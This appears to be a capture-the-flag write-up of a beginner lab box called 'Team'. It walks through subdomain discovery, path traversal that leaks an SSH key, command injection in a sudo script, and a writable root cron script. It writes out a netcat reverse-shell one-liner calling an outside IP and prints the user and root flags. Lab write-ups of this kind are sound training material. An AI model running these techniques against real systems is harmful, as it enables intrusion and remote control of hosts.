
-------

#### IP Given -> **10.82.164.224**
# Description

Hey all, this is my first box! It is aimed at beginners as I often see boxes that are "easy" but are often a bit harder!

**Please allow 3-5 minutes for the box to boot.**

Edit 06/03/21 - Just to clarify there are several ways to root this machine. One is unintended but it is just another opportunity to learn. :)

_Created by: dalemazza_

_Credit to P41ntP4rr0t for help along the way_

---------
# Enumeration

First thing I did was adding the **IP mapping to the /etc/hosts file**.
![[Pasted image 20251123142730.png]]


Taking a look at team.thm, we bump into a website.
![[Pasted image 20251123142828.png]]

It looks like a **simple blog** where you can **post photos etc**.

Let's run **nmap and gobuster** to get a real **footprint** of the machine.

----

# Nmap

![[Pasted image 20251123144622.png]]

As we can see, we have port **21 (FTP), 22 (SSH) and 80 (HTTP)**.

None of the service versions seem vulnerable to known exploits.

----------

# Gobuster

After some time, I got these **4 endpoints**.
![[Pasted image 20251123144809.png]]

The only ones I **could access were robots.txt and images**; the **rest** of them were **forbidden**.
![[Pasted image 20251123144857.png]]

Taking a **look at robots.txt**, we bump into the word **dale**. It might be a **username.**
![[Pasted image 20251123145039.png]]

The **images directory only had photos being used on the website**. Yes, it could have some steganography, but I'm too lazy to check. In the worst case, I'll come back to this.

Let's try to use gobuster to find **any subdomains**.
![[Pasted image 20251123154548.png]]

We found:
1. **dev.team.thm**
2. **www.dev.team.thm**

Let's **add** them to **/etc/hosts** and **visit them**.

Both of them show this.
![[Pasted image 20251123154830.png]]

As you can see, we have a link to something. When we clicked it, it leads us to `script.php?page=teamshare.php`. Maybe we can do some **path traversal**.

![[Pasted image 20251123154906.png]]

We are able to do that.
![[Pasted image 20251123155023.png]]

With this we confirm that we have a **dale user**.
![[Pasted image 20251123155048.png]]

I managed to guess the location of the user flag.
![[Pasted image 20251123163445.png]]

## USER FLAG
```user flag
THM{6Y0TXHz7c2d}
```

I also ran a gobuster scan against those two endpoints I didn't have access to, just in case, and I found a script on one of those endpoints.
![[Pasted image 20251123163651.png]]
![[Pasted image 20251123163639.png]]

Since we had the ability to read any file (with enough permissions), I downloaded a wordlist with possible paths of important files.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt (This one)

Since we had SSH and FTP, I decided to look into those first.

When I looked into the file `/etc/ssh/sshd_config`, I found dale's id_rsa file used for SSH login.

![[Pasted image 20251123164155.png]]

The format of the key is weird, so I made a script to fix it.
![[Pasted image 20251123164610.png]]
![[Pasted image 20251123164625.png]]

After that we are able to SSH into the machine as dale.

---

# SSH

## Priv Escalation to gyles

Giving the right permissions to the file, we are able to log in.
![[Pasted image 20251123164651.png]]

Running **sudo -l** we see that we are able to run (as **gyles**) **/home/gyles/admin_checks**.
![[Pasted image 20251123164729.png]]

Let's check that file.
![[Pasted image 20251123170138.png]]

This file is vulnerable via the variable `error`, since they ask for input and then execute that input on the line:
> $error 2>/dev/null

Using the input `bash`, we can spawn a shell as gyles.

![[Pasted image 20251123170320.png]]

Nice, now we are gyles.

---

# Priv Escalation to Root

Using **linpeas.sh**, we find a file named `/usr/local/bin/main_backup.sh`.
Let's take a look at it.

```
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

I noticed this script was being run as a crontab by root (looking at the processes).

The file is also writable, so we can just put `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.134.163 4444 >/tmp/f` to get a reverse shell as root.
![[Pasted image 20251123171007.png]]

![[Pasted image 20251123171045.png]]

## ROOT FLAG
```root flag
THM{fhqbznavfonq}
```

---------------
